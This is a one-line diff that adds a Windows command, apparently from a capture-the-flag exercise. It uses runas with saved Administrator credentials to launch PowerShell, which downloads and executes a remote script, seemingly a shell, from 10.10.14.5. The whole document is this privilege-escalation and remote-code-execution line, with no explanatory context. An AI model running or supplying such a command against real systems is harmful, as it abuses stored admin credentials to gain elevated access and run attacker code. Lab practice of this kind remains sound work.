@@ -1,0 +1,1 @@
+runas /user:ACCESS\Administrator /savecred "powershell iex((new-object net.webclient).downloadstring('http://10.10.14.5/p1233shell.ps1'))"
